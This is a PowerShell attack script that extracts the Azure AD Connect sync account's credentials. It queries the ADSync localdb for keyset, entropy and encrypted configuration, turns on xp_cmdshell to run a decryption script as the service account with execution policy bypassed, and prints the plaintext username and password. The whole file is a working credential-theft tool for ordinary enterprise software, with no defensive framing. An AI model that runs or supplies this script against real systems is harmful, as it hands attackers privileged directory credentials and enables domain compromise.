Write-Host "AD Connect Sync-account Credential Extract"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}

Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

Write-Host "[*] Querying ADSync localdb (mms_management_agent)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent"
    return
}

$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

Write-Host "[*] Using xp_cmdshell to run some Powershell as the service user"

$crypted | Out-File -FilePath "C:\Temp\crypted.txt"

$cmd = $client.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -executionpolicy bypass -File c:\Temp\decrypt.ps1 $entropy $instance_id $key_id'"
$reader = $cmd.ExecuteReader()

$decrypted = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $decrypted += $reader.GetString(0)
}

if ($decrypted -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

#Write-Host "$($config)"
#Write-Host "$($decrypted)"

$username = select-xml -Content $config -XPath "//parameter[@name='UserName']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute[@name='Password']" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"

Write-Host "Username: $($username.Username)"
Write-Host "Password: $($password.Password)"
